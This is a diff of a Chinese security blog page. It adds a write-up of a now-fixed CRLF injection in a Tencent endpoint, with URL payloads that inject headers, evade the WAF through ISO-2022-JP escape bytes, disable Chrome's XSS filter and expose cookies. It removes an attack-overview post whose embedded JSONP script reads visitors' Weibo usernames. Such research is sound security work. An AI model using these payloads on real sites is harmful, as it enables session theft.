@@ -259,6 +259,140 @@
             
               
                 
+                <a class="post-title-link" href="/2016/01/31/CRLF-Injection-and-Bypass-WAF/" itemprop="url">
+                  CRLF Injection and Bypass Tencent WAF
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2016-01-31T14:01:31+08:00" content="2016-01-31">
+              2016-01-31
+            </time>
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/01/31/CRLF-Injection-and-Bypass-WAF/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/01/31/CRLF-Injection-and-Bypass-WAF/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这是一篇关于HTTP Response Split（CRLF Injection）漏洞的及绕过腾讯WAF导致前端出现XSS的实例分析，个人觉得在这个过程中能学到点知识，因此整理出来分享一下，如果不感兴趣记得及时关闭页面。</p>
+<h2 id="关于HRS问题"><a href="#关于HRS问题" class="headerlink" title="关于HRS问题"></a>关于HRS问题</h2><p>我们都知道，HTTP协议是依靠两个CRLF，即<code>\r\n</code>来分割HTTP头部及响应体。基于这个认知，可以推出，HRS问题是由于服务端程序没有过滤掉头部中的特殊字符<code>%0D%0A</code>，直接输出到了返回的数据中，导致错误的解析。而在日常开发中，最常见的莫过于有以下的两种功能（1）URL跳转（2）Cookie的设置中出现。接下来的小节里，将会以一个Cookie实例作来说明这个问题的危害。实例在：<a href="http://wooyun.org/bugs/wooyun-2016-0173904" target="_blank" rel="external">http://wooyun.org/bugs/wooyun-2016-0173904</a> ，目前腾讯已经修复了。</p>
+<h2 id="接口说明"><a href="#接口说明" class="headerlink" title="接口说明"></a>接口说明</h2><p>这个接口在大家使用微信红包的过程中都用过，我用xxx.com代表接口的域名，具体接口的功能我就先不说，虽然危害不大。接口如下：<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">https:</span><span class="comment">//xxx.com/cgi-bin/xxx/geiwofahongbaowojiugaosuni?exportkey=&amp;pass_ticket=a</span></span><br></pre></td></tr></table></figure></p>
+<p>返回<br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="status">HTTP/1.1 <span class="number">200</span> OK</span></span><br><span class="line"><span class="attribute">Server</span>: <span class="string">nginx/1.6.0</span></span><br><span class="line"><span class="attribute">Date</span>: <span class="string">Sat, 30 Jan 2016 12:08:28 GMT</span></span><br><span class="line"><span class="attribute">Content-Type</span>: <span class="string">text/html; charset=gbk</span></span><br><span class="line"><span class="attribute">Content-Length</span>: <span class="string">0</span></span><br><span class="line"><span class="attribute">Connection</span>: <span class="string">keep-alive</span></span><br><span class="line"><span class="attribute">Cache-Control</span>: <span class="string">no-cache, must-revalidate</span></span><br><span class="line"><span class="attribute">Set-Cookie</span>: <span class="string">pass_ticket=a; Domain=xxx.com; Path=/; Expires=Sun, 31-Jan-2016 12:08:28 GMT</span></span><br></pre></td></tr></table></figure></p>
+<p>在微信端这个接口其实没有什么问题，因为微信客户端会把这个参数替换掉，因此攻击者填入的参数就会被直接去掉，然而在浏览器中，却导致了XSS。</p>
+<h2 id="一步一个脚印"><a href="#一步一个脚印" class="headerlink" title="一步一个脚印"></a>一步一个脚印</h2><h4 id="0x00-插入img标签"><a href="#0x00-插入img标签" class="headerlink" title="0x00 插入img标签"></a>0x00 插入img标签</h4><p>从上面接口的返回数据中，可以看到pass_ticket参数的值出现在了Set-Cookie头部中，我们先试试能不能用插入两个CRLF，然后插入img标签。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exportkey=&amp;pass_ticket=a%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">3</span>Cimg%<span class="number">20</span>src=<span class="number">1</span>%<span class="number">3</span>E</span><br></pre></td></tr></table></figure></p>
+<p>然而这个请求返回了空，浏览器根本不去解析body里的内容。不能放弃，通过curl分析一下，发现其实后端并没有过滤，请求都返回了，只是Content-Length为0导致浏览器认为Body为空，使用命令<code>curl -kv &lt;url&gt;</code>可以看到以下的错误提示。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* Excess found in a non pipelined read: excess = <span class="number">84</span> url = </span><br><span class="line">  /cgi-bin/xxx/geiwofahongbaowojiugaosuni?exportkey=&amp;pass_ticket=a%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">3</span>Cimg%<span class="number">20</span>src=<span class="number">1</span>%<span class="number">3</span>E</span><br><span class="line">  (zero-length body)</span><br></pre></td></tr></table></figure></p>
+<p>知道问题之后，我们下一步就是想方法让Content-Length的值不为0！试着在头部插入<code>Content-Length: 60</code>,得到以下的URL<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exportkey=&amp;pass_ticket=a%<span class="number">0</span>d%<span class="number">0</span>aContent-Length:<span class="number">60</span>%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">3</span>Cimg%<span class="number">20</span>src=<span class="number">1</span>%<span class="number">3</span>E</span><br></pre></td></tr></table></figure></p>
+<p>浏览器里访问，bingo，图片出现了！</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="status">HTTP/1.1 <span class="number">200</span> OK</span></span><br><span class="line"><span class="attribute">Server</span>: <span class="string">nginx/1.6.0</span></span><br><span class="line"><span class="attribute">Date</span>: <span class="string">Sat, 30 Jan 2016 12:15:03 GMT</span></span><br><span class="line"><span class="attribute">Content-Type</span>: <span class="string">text/html; charset=gbk</span></span><br><span class="line"><span class="attribute">Content-Length</span>: <span class="string">60</span></span><br><span class="line"><span class="attribute">Connection</span>: <span class="string">keep-alive</span></span><br><span class="line"><span class="attribute">Cache-Control</span>: <span class="string">no-cache, must-revalidate</span></span><br><span class="line"><span class="attribute">Set-Cookie</span>: <span class="string">pass_ticket=a</span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="title">img</span> <span class="attribute">src</span>=<span class="value">1</span>&gt;</span>; Domain=wx.tenpay.com; Path=/; Expires=Sun, 31-J</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/zhchbin/zhchbin.github.io/source/source/images/56af0f2a143cfa3753b39a38XV1CJIiq.png" alt=""></p>
+<h4 id="0x01-尝试执行脚本"><a href="#0x01-尝试执行脚本" class="headerlink" title="0x01 尝试执行脚本"></a>0x01 尝试执行脚本</h4><p>能够插入img标签之后，我半生不熟的前端知识告诉我，src=1，图片肯定会加载失败，失败了就会有onerror的事件发生。于是，试试下面的URL<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exportkey=&amp;pass_ticket=a%<span class="number">0</span>d%<span class="number">0</span>aContent-Length:<span class="number">60</span>%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">3</span>Cimg%<span class="number">20</span>src=<span class="number">1</span>%<span class="number">20</span>onerror=alert(<span class="number">1</span>)%<span class="number">3</span>E</span><br></pre></td></tr></table></figure></p>
+<p>事实告诉我们，现实并没有想象中的美好，服务器直接返回了501，这是什么原因导致的？尝试几次之后推断是被WAF拦截了。WAF是Web Application Firewall的缩写，我们的“恶意”请求被它检查出来。试了一下，发现在被和谐的的onerror和alert中间插入一些其他字符，就不会被拦截，例如：<code>on\error=al\ert(1)</code>，然而这并没有什么卵用，因为这根本就不是合法的HTML属性。</p>
+<h4 id="0x02-Bypass-WAF"><a href="#0x02-Bypass-WAF" class="headerlink" title="0x02 Bypass WAF"></a>0x02 Bypass WAF</h4><p>有WAF，就得考虑如何绕过，然而在确认了自己的认知范围里并没有绕过的方法后，我去请教了<a href="http://www.wooyun.org/whitehats/mramydnei" target="_blank" rel="external">@mramydnei</a>。以下是他提供的思路及Bypass WAF的例子：</p>
+<p>大概原理就是： </p>
+<ol>
+<li>插入Content-Type更改response中的charset</li>
+<li>选择一个字符集，保证该字符集中的某个字符或字符串会被浏览器忽略（也可以是unicode transform）</li>
+<li>将会被忽略的字符插入到被blacklist拦截的字符之间</li>
+<li>done</li>
+</ol>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exportkey=&amp;pass_ticket=a%<span class="number">0</span>D%<span class="number">0</span>AContent-Length:<span class="number">120</span>%<span class="number">0</span>D%<span class="number">0</span>AContent-Type:text/html;%<span class="number">20</span>charset=ISO-<span class="number">2022</span>-JP%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">3</span>Cimg%<span class="number">20</span>src=x%<span class="number">20</span>on%<span class="number">1</span>B%<span class="number">28</span>Jerror=al%<span class="number">1</span>B%<span class="number">28</span>Jert%<span class="number">28</span>document.domain%<span class="number">29</span>%<span class="number">3</span>E</span><br></pre></td></tr></table></figure>
+<p>看到他的回复后，我只有一个想法：人要有敬畏之心！后来找了一下，在Chrome的Issue List找到了一些相关的讨论，<a href="https://crbug.com/114941" target="_blank" rel="external">https://crbug.com/114941</a></p>
+<h4 id="0x03-绕过浏览器的XSS过滤"><a href="#0x03-绕过浏览器的XSS过滤" class="headerlink" title="0x03 绕过浏览器的XSS过滤"></a>0x03 绕过浏览器的XSS过滤</h4><p>由于是反射型的XSS，Chrome里直接访问的时候会发现它拦截了脚本的执行，虽然在firefox里是可行的。从上面中的分析过程中，我们可以知道一个事情：可以在返回的头部的信息里插入任何头部信息！这看上去很赞，于是就想起了Chrome的XSS过滤是可以被关闭的，只要你返回的头部中带有<code>X-XSS-Protection:0</code>，构造URL如下：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exportkey=&amp;pass_ticket=a%<span class="number">0</span>D%<span class="number">0</span>AContent-Length:<span class="number">120</span>%<span class="number">0</span>D%<span class="number">0</span>AX-XSS-Protection:<span class="number">0</span>%<span class="number">0</span>D%<span class="number">0</span>AContent-Type:text/html;%<span class="number">20</span>charset=ISO-<span class="number">2022</span>-JP%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">3</span>Cimg%<span class="number">20</span>src=x%<span class="number">20</span>on%<span class="number">1</span>B%<span class="number">28</span>Jerror=%<span class="number">22</span>al%<span class="number">1</span>B%<span class="number">28</span>Jert%<span class="number">28</span>document.co%<span class="number">1</span>B%<span class="number">28</span>Jokie%<span class="number">29</span>%<span class="number">22</span>%<span class="number">3</span>E</span><br></pre></td></tr></table></figure>
+<p>点击后可以看到页面弹出了用户的Cookie，好了。虽然我们的<code>xxx.com</code>只是它的某个子域，这里的Cookie却弹出了其他子域名的，为什么呢？因为前端用了<code>document.domain = xx.com</code>。</p>
+<p><img src="https://raw.githubusercontent.com/zhchbin/zhchbin.github.io/source/source/images/56af08cb143cfae54c9777d4NE61bZEx.png" alt=""></p>
+<h2 id="最后说几句"><a href="#最后说几句" class="headerlink" title="最后说几句"></a>最后说几句</h2><p>在这个过程中，你学到了什么呢？反思这个过程，我觉得是信息量好大。对于我们做开发的，我认为最重要的一点是，用户的输入都是不可信的（这句话已经被无数人说过无数次了应该）。另外我读了一下Python Web框架里的一些代码，发现有些框架已经帮我们处理掉部分问题，例如在Flask中调用设置Cookie的相关接口中，<code>werkzeug</code>会使用白名单的机制检查每个byte，如果发现恶意字符，则将输入的值中用双引号包围起来，同时还有转义一部分字符，具体代码在这里：<a href="https://github.com/mitsuhiko/werkzeug/blob/master/werkzeug/_internal.py#L222" target="_blank" rel="external">https://github.com/mitsuhiko/werkzeug/blob/master/werkzeug/_internal.py#L222</a> 。</p>
+<p>放几个参考链接：</p>
+<ol>
+<li><a href="https://en.wikipedia.org/wiki/HTTP_response_splitting" target="_blank" rel="external">https://en.wikipedia.org/wiki/HTTP_response_splitting</a></li>
+<li><a href="http://blog.bentkowski.info/2014/07/google-doodle-xss-actually-response.html" target="_blank" rel="external">http://blog.bentkowski.info/2014/07/google-doodle-xss-actually-response.html</a> </li>
+<li><a href="http://drops.wooyun.org/papers/2466" target="_blank" rel="external">http://drops.wooyun.org/papers/2466</a></li>
+</ol>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
                 <a class="post-title-link" href="/2015/12/26/2015-summary/" itemprop="url">
                   2015的无聊总结
                 </a>
@@ -359,171 +493,11 @@
 
 
     
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2015/12/05/how-do-your-websites-get-hacked/" itemprop="url">
-                  你的网站是怎么被黑的
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2015-12-05T21:22:09+08:00" content="2015-12-05">
-              2015-12-05
-            </time>
-          </span>
-
-          
-
-          
-            
-              <span class="post-comments-count">
-                &nbsp; | &nbsp;
-                <a href="/2015/12/05/how-do-your-websites-get-hacked/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2015/12/05/how-do-your-websites-get-hacked/" itemprop="commentsCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p><link rel="stylesheet" href="http://apps.bdimg.com/libs/alertify.js/0.3.11/alertify.core.css"></p>
-<p><link rel="stylesheet" href="http://apps.bdimg.com/libs/alertify.js/0.3.11/alertify.default.css"></p>
-<script type="text/javascript" src="http://apps.bdimg.com/libs/jquery/2.1.4/jquery.js"></script>
-<script src="http://apps.bdimg.com/libs/alertify.js/0.3.11/alertify.min.js"></script>
-<script>
-$(function() {
-  $.ajax({
-    url: 'http://game.weibo.com/home/indexv3/pajaxUserInfo',
-    jsonp: "callback",
-    dataType: "jsonp",
-    success: function(response) {
-      if (response.errorCode != 0)
-        return;
-
-      alertify.set({ delay: 10000 });
-      alertify.log(response.data['user_name'] + "，您好啊！");
-    }
-  });
-});
-</script>
-
-<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个标题的来源是@evilcos（余弦大大）在Github上分享的一个PPT，感兴趣的可以去他的<a href="https://github.com/evilcos/papers/blob/9b16668d4f9733272082bb9b399acfb85ba8083c/%E7%A7%91%E6%99%AE_%E4%BD%A0%E7%9A%84%E7%BD%91%E7%AB%99%E6%98%AF%E6%80%8E%E4%B9%88%E8%A2%AB%E9%BB%91%E7%9A%84.pptx" target="_blank" rel="external">repo</a>下载。写这篇博客主要是想给自己最近业余时间学到的安全相关的知识做个总结，主要是关于网站常见漏洞的攻击和利用，不过由于我也是刚入门，写得肯定不怎么到位，不感兴趣就不要浪费时间了哈。</p>
-<p>很久之前在乌云上注册过一个账号，最近也刷了一波漏洞，终于升级变成了实习白帽子的级别。</p>
-<h2 id="未知攻焉知防"><a href="#未知攻焉知防" class="headerlink" title="未知攻焉知防"></a>未知攻焉知防</h2><p>这句话可谓安全圈里的金句（据说出自TK教主，我还没混入圈子，不敢确定）。如果给一个黑客一个网站，他们会怎么下手呢？这里的黑客当然是好人！业界称他们为白帽子。而攻击的过程也叫做渗透测试。</p>
-<h3 id="收集信息阶段"><a href="#收集信息阶段" class="headerlink" title="收集信息阶段"></a>收集信息阶段</h3><ul>
-<li>域名会给出什么信息呢？通过查询whois，就可以得到站长的信息（如邮箱，注册人，地址，电话等）</li>
-<li>域名对应IP地址，对该IP使用nmap扫描，可以知道该服务器的基本信息，如开启了什么端口，21是FTP，22是SSH，80/443是HTTP服务的端口，3306就是MYSQL的默认端口，服务器上使用的是什么系统。</li>
-<li>查看网站的robots.txt文件，开发者不希望被爬虫抓取的信息都在这里哦，所以可能有后台地址，有可能指向网站的配置文件（你也会好奇你怎么配置了这么奇怪的robots.txt吧）</li>
-<li>旁站攻击，通常会有意想不到的收获。旁站指的是跟你站点部署在相同一台服务器上的其他站点。虽然你本身站点做好了安全工作，但也难以保证其他站点不存在漏洞导致服务器被控制的。更新：今天刚好看到个例子，<a href="http://www.wooyun.org/bugs/wooyun-2015-0149244" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2015-0149244</a></li>
-<li>C端，顺便扫一下该服务器IP所在的C段</li>
-<li>上Github上搜索该域名对应的邮箱账号。很多公司都会有自己的邮箱系统，而开发人员有时候会很可爱地分享出他们的密码。搜索的关键词如：<code>smtp 某域名</code>，耐心翻的话可能有收获；有些开发还可能上传项目的代码呢！</li>
-<li>子域名，查询子域名还可以知道该站点存在哪些其他的系统，多了不少入口！</li>
-<li>Google收集信息，搜索语法如使用<code>site:域名</code>，<code>inurl:域名</code>等。</li>
-<li>常见网站的路径扫描，可能扫出后台地址，phpinfo等</li>
-</ul>
-<p>还有很多其他收集信息的方法，暂时能想到的就这些了。这里找到的信息有些足以令他们进行一次内网漫游了。</p>
-<h3 id="漏洞挖掘阶段"><a href="#漏洞挖掘阶段" class="headerlink" title="漏洞挖掘阶段"></a>漏洞挖掘阶段</h3><ul>
-<li>存在未授权的服务？比如mongodb，mysql，redis，memcached等服务配置错误，暴露在外网。这个足以利用来拿下服务器了。就拿前段时间比较火的redis未授权访问来举例吧，被挖到的话，他们就可以在运行redis的用户下插入<code>authorized_keys</code>，继而SSH到你的服务器上进行任何他想做的操作了。这个漏洞还可以利用来实现远程命令执行。乌云漏洞例子：<a href="http://wooyun.org/bugs/wooyun-2010-0154887" target="_blank" rel="external">http://wooyun.org/bugs/wooyun-2010-0154887</a></li>
-<li>后台登录没有验证码？或者验证码可以绕过，比如把验证码写在cookie里，比如一个验证码可以无限次使用？好吧，爆破不用商量。你是想象不到他们手上的字典是有多厉害！他们可以利用前面信息收集阶段的内容，有针对性地fuzz出一份成功率相当高的字典。如果你不幸使用了弱密码，比如：<code>admin, 123456</code>等等，那就更不用担心你的服务器不会被入侵了。例子太多，不举例。</li>
-<li>服务器上所使用的软件存在漏洞？著名的心脏出血漏洞就是这类漏洞的典型代表。而最近比较热门的是Java的反序列化的问题，乌云漏洞例子：<a href="http://wooyun.org/bugs/wooyun-2010-0156418" target="_blank" rel="external">http://wooyun.org/bugs/wooyun-2010-0156418</a></li>
-<li>站点相关的邮箱密码泄露了！他会在你的邮箱里找vpn连接，找各种密码，找任何有用的信息！放个例子：<a href="http://www.wooyun.org/bugs/wooyun-2010-0145407" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2010-0145407</a></li>
-<li>还有一个神器叫做metaspolit，目前我还不是很熟悉，暂时先留空。</li>
-</ul>
-<p>接下来要说的是关于应用层上的一些漏洞了。</p>
-<ul>
-<li>首先是XSS漏洞，分反射型和存储型等。XSS盗用户Cookie是挺常见的，利用XSS甚至可以打到后台：比如通过网站的私信功能呢发送给网站的管理员，管理员点开就完蛋了。例子：<a href="http://www.wooyun.org/bugs/wooyun-2010-0145738" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2010-0145738</a> 分享一个XSS实例教程：<a href="http://www.wooyun.org/whitehats/%E5%BF%83%E4%BC%A4%E7%9A%84%E7%98%A6%E5%AD%90" target="_blank" rel="external">link</a> 全部都是腾讯的案例！</li>
-<li>CSRF跨站伪造请求漏洞，危害的是网站的用户。如果管理员的某些操作，比如修改用户的密码存在这个漏洞，那么他就会写一个页面，然后社工管理员去点开。如果此时浏览器里管理员登陆，那么用户的密码就会被重置。这种漏洞在微博这种社交应用里危害更大，可直接导致蠕虫攻击。最近看到的例子：<a href="http://linux.im/2015/11/23/SinaWeibo-Worm.html" target="_blank" rel="external">http://linux.im/2015/11/23/SinaWeibo-Worm.html</a></li>
-<li>SQL注入，在乌云上挺常见的。他可以使用神奇SQLMap测试是否存在注入点。如果你的接口存在该漏洞，哪怕是只有一处，那也是致命的。如果运行数据库的用户权限够，利用来拿下你的服务器应该可以说是分分钟的事情，利用某些注入点sqlmap可以连接到服务器的shell上。另外，SQL注入漏洞也会泄露用户信息，造成脱裤。泄露管理员的账号和密码，直接导致后台沦陷。在乌云上也是能找到一大堆，不举例了。</li>
-<li>任意文件下载，如果你的站点存在这种漏洞，也就是说你的服务上的所有东西都可以被下载，包括你的服务器配置信息！看例子吧：<a href="http://www.wooyun.org/bugs/wooyun-2010-0145972" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2010-0145972</a> 标题：某省铁路建设投资公司网站系统漏洞导致任意文件下载并登录后台、任意文件修改并shell</li>
-<li>任意文件上传，你的站点没有检查用户上传上来的文件内容就直接保存了？还按照用户指定的后缀保存？还放到了可执行的目录下？那就等着被上传web shell吧。Github上有很多人分享的各种各样的webshell，上传到你的服务器之后，他就可以列出你的服务器上所有文件并下载，通过webshell在你的服务器上执行命令。乌云例子：<a href="http://www.wooyun.org/bugs/wooyun-2010-0151657" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2010-0151657</a></li>
-<li>逻辑漏洞，比如某个用户可以看到他本不应该看到的信息，常见的情景如用户信息页，只要使用其他用户ID就可以查看到相应的信息，常用的叫法是叫做越权，漏洞例子：<a href="http://wooyun.org/bugs/wooyun-2010-0156326" target="_blank" rel="external">http://wooyun.org/bugs/wooyun-2010-0156326</a> 。再比如找回密码的逻辑漏洞，找回密码使用手机找回，验证码只有4位，且可以被无限次猜。那就不要怪他用神奇burpsuite的intruder模式，直接猜到验证码重置任意用户信息了。关于常见的找回密码漏洞可以看：<a href="http://drops.wooyun.org/web/5048" target="_blank" rel="external">http://drops.wooyun.org/web/5048</a> 。再比如，把cookie当session使用，后台权限bypass等。</li>
-<li>可被暴力破解或撞库！比如没有限制用户密码尝试次数还没有带验证码，例子：<a href="http://wooyun.org/bugs/wooyun-2015-0124461" target="_blank" rel="external">http://wooyun.org/bugs/wooyun-2015-0124461</a></li>
-</ul>
-<p>还有很多其他问题，因为学艺未精，暂时写到这里吧。</p>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>当然是上报到安全平台刷rank，报告给厂商后，说不定厂商好心还可以拿个礼物！！！</p>
-<h2 id="吐槽"><a href="#吐槽" class="headerlink" title="吐槽"></a>吐槽</h2><ul>
-<li>好久没写博客了。（意思是写得不好都是我的错）</li>
-<li>这篇文章提到的东西我都不懂，我只是做个名词解释，目前还处于入门阶段！希望自己以后能深入研究各种思路。</li>
-<li>请不要利用文章中提到的知识干坏事！！！</li>
-</ul>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/5/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/7/"><i class="fa fa-angle-right"></i></a>
+    <a class="extend prev" rel="prev" href="/page/5/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/7/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -564,7 +538,7 @@ $(function() {
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">18</span>
+              <span class="site-state-item-count">19</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
